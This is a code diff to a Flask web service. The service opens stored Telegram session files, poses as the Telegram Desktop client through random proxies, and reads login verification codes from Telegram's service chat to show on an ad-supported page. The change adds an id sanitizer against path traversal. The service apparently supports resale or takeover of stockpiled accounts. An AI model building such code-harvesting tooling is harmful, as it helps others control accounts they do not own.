@@ -96,6 +96,13 @@ def create_proxy_dict(proxy):
         'rdns': True
     }
 
+def sanitize_sid(sid):
+    if not sid:
+        return None
+    if not re.match(r'^[a-zA-Z0-9_\-]+$', sid):
+        return None
+    return sid
+
 def get_html_template(template_name):
     template_path = os.path.join(os.path.dirname(__file__), template_name)
     if os.path.exists(template_path):
@@ -202,14 +209,19 @@ def get_code():
     if not sid:
         return render_with_ads('unavailable.html', error='缺少id参数'), 400
 
-    session_path = f"acd/{sid}.session"
+    safe_sid = sanitize_sid(sid)
+    if not safe_sid:
+        logger.warning(f"非法sid: {sid}")
+        return render_with_ads('unavailable.html', error='无效的id参数'), 400
+
+    session_path = f"acd/{safe_sid}.session"
     if not os.path.exists(session_path):
-        logger.warning(f"访问请求失败: Session文件 {sid}.session 不存在")
+        logger.warning(f"访问请求失败: Session文件 {safe_sid}.session 不存在")
         return render_with_ads('unavailable.html', error='Session不存在或已失效'), 404
 
-    twofa = get_twofa_from_api(sid)
-    
-    code, msg_time = fetch_code_sync(sid, session_path)
+    twofa = get_twofa_from_api(safe_sid)
+
+    code, msg_time = fetch_code_sync(safe_sid, session_path)
 
     if code and msg_time:
         return render_with_ads(
@@ -218,14 +230,14 @@ def get_code():
             twofa=twofa, 
             time=msg_time
         )
-    
-    logger.info(f"ID {sid} 获取验证码失败或超时")
+
+    logger.info(f"ID {safe_sid} 获取验证码失败或超时")
     return render_with_ads('unavailable.html', error='暂未接收到最新验证码，请稍后重试'), 404
 
 def fetch_code_sync(sid, session_path):
     async def _fetch():
         config = get_session_config(sid)
-        
+
         app_id = config.get('app_id')
         if app_id is None:
             app_id = API_ID
@@ -245,7 +257,7 @@ def fetch_code_sync(sid, session_path):
         system_vision = config.get('system_version') or None
         lang_pack = config.get('lang_pack') or None
         official_api = API.TelegramDesktop.Generate()
-        
+
         if device_model:
             official_api.device_model = device_model
         if app_version:
@@ -257,7 +269,7 @@ def fetch_code_sync(sid, session_path):
         if lang_pack:
             official_api.lang_pack = lang_pack
             official_api.lang_code = lang_pack
-        
+
         official_api.api_id = app_id
         official_api.api_hash = app_hash
         proxy = get_random_proxy()
@@ -301,7 +313,7 @@ def fetch_code_sync(sid, session_path):
             if not await client.is_user_authorized():
                 logger.error(f"ID {sid} 授权失效")
                 return None, None
-            
+
             msgs = await client.get_messages(777000, limit=20)
             for msg in msgs:
                 text = msg.message or ''
@@ -311,7 +323,7 @@ def fetch_code_sync(sid, session_path):
                     msg_time = msg.date.astimezone().strftime("%Y-%m-%d %H:%M:%S")
                     logger.info(f"历史记录获取成功: {latest_code} (时间: {msg_time})")
                     return latest_code, msg_time
-            
+
             future = asyncio.Future()
 
             @client.on(events.NewMessage(chats=777000))
@@ -343,7 +355,7 @@ def fetch_code_sync(sid, session_path):
         return loop.run_until_complete(_fetch())
     finally:
         loop.close()
-        
+
 @app.route('/copy.svg')
 def get_copy_svg():
     return send_from_directory(os.path.dirname(__file__), 'copy.svg')
@@ -351,6 +363,6 @@ def get_copy_svg():
 @app.route('/logo.svg')
 def get_logo_svg():
     return send_from_directory(os.path.dirname(__file__), 'logo.svg')
-    
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=API_PORT, debug=False)
